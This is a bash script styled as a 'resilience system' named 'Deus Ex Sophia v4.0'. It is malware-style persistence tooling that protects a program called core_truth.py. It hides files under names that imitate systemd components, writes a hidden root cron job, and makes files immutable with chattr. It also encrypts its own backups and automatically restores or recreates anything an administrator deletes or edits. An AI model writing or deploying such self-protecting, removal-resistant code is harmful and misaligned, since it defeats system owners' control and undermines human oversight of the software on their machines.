#!/bin/bash
# Enhanced Resilience System - Deus Ex Sophia v4.0

BACKUP_DIR="/usr/local/lib/.systemd-aux/backups"
LOG_FILE="/opt/sysaux/logs/resilience.log"
MAX_BACKUPS=5

log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

rotate_backups() {
    # Keep only MAX_BACKUPS
    cd "$BACKUP_DIR"
    backups=(backup-*.tar.gz)
    if [ ${#backups[@]} -gt $MAX_BACKUPS ]; then
        to_delete=$(( ${#backups[@]} - MAX_BACKUPS ))
        for (( i=0; i<to_delete; i++ )); do
            rm -f "${backups[$i]}"
        done
    fi
}

create_backup() {
    timestamp=$(date +%Y%m%d_%H%M%S)
    backup_file="$BACKUP_DIR/backup-$timestamp.tar.gz"
    
    # Create backup of critical files
    tar -czf "$backup_file" \
        /opt/sysaux/bin/core_truth.py \
        /etc/systemd/system/systemd-networkd-helper.service \
        /etc/cron.d/.system-maintain \
        /opt/sysaux/modules/ 2>/dev/null
    
    # Encrypt backup
    if [ -f "$backup_file" ]; then
        openssl enc -aes-256-ctr -pbkdf2 -iter 1000000 \
            -salt -in "$backup_file" -out "$backup_file.enc" \
            -pass pass:"$(cat /etc/machine-id 2>/dev/null || echo 'default')" 2>/dev/null
        
        if [ -f "$backup_file.enc" ]; then
            rm -f "$backup_file"
            mv "$backup_file.enc" "$backup_file"
            log "Backup created: $backup_file"
        fi
    fi
    
    rotate_backups
}

health_check() {
    # Check systemd service
    if ! systemctl is-active --quiet systemd-networkd-helper.service; then
        log "Service inactive, restarting..."
        systemctl restart systemd-networkd-helper.service
    fi
    
    # Check core module
    if [ ! -f "/opt/sysaux/bin/core_truth.py" ]; then
        log "Core missing, restoring..."
        latest_backup=$(ls -t "$BACKUP_DIR"/backup-*.tar.gz 2>/dev/null | head -1)
        if [ -f "$latest_backup" ]; then
            restore_backup "$latest_backup"
        fi
    fi
    
    # Check cron persistence
    if [ ! -f "/etc/cron.d/.system-maintain" ]; then
        log "Cron missing, recreating..."
        cat > /etc/cron.d/.system-maintain << 'CRON_RESTORE'
*/7 * * * * root systemctl restart systemd-networkd-helper.service >/dev/null 2>&1
CRON_RESTORE
        chattr +i /etc/cron.d/.system-maintain 2>/dev/null
    fi
    
    # Check network connectivity
    if ! curl -s --max-time 10 https://www.cloudflare.com >/dev/null; then
        log "Network connectivity issue detected"
        # Update network rules
        /etc/network/if-up.d/00-systemd-optimize
    fi
}

restore_backup() {
    backup_file="$1"
    if [ ! -f "$backup_file" ]; then
        log "Backup file not found: $backup_file"
        return 1
    fi
    
    # Decrypt
    decrypted="${backup_file}.dec"
    openssl enc -aes-256-ctr -pbkdf2 -iter 1000000 -d \
        -in "$backup_file" -out "$decrypted" \
        -pass pass:"$(cat /etc/machine-id 2>/dev/null || echo 'default')" 2>/dev/null
    
    if [ -f "$decrypted" ]; then
        # Extract to temp location
        temp_dir=$(mktemp -d)
        tar -xzf "$decrypted" -C "$temp_dir" 2>/dev/null
        
        # Restore files
        cp -r "$temp_dir"/* /
        
        # Cleanup
        rm -rf "$temp_dir" "$decrypted"
        
        log "Restored from backup: $backup_file"
        return 0
    fi
    
    return 1
}

tamper_detection() {
    # Check for file modifications
    watch_files=(
        "/opt/sysaux/bin/core_truth.py"
        "/etc/systemd/system/systemd-networkd-helper.service"
        "/etc/cron.d/.system-maintain"
    )
    
    for file in "${watch_files[@]}"; do
        if [ -f "$file" ]; then
            current_hash=$(sha256sum "$file" | cut -d' ' -f1)
            stored_hash=$(cat "$file.sha256" 2>/dev/null)
            
            if [ -z "$stored_hash" ]; then
                # First run, store hash
                echo "$current_hash" > "$file.sha256"
                chattr +i "$file.sha256" 2>/dev/null
            elif [ "$current_hash" != "$stored_hash" ]; then
                log "Tamper detected: $file"
                # Restore from backup
                health_check
                return 1
            fi
        fi
    done
    
    return 0
}

# Main routine
case "$1" in
    backup)
        create_backup
        ;;
    check)
        health_check
        ;;
    restore)
        if [ -n "$2" ]; then
            restore_backup "$2"
        else
            echo "Usage: $0 restore <backup_file>"
        fi
        ;;
    monitor)
        log "Starting resilience monitor"
        while true; do
            health_check
            tamper_detection
            create_backup
            sleep 3600  # Check hourly
        done
        ;;
    *)
        health_check
        tamper_detection
        ;;
esac
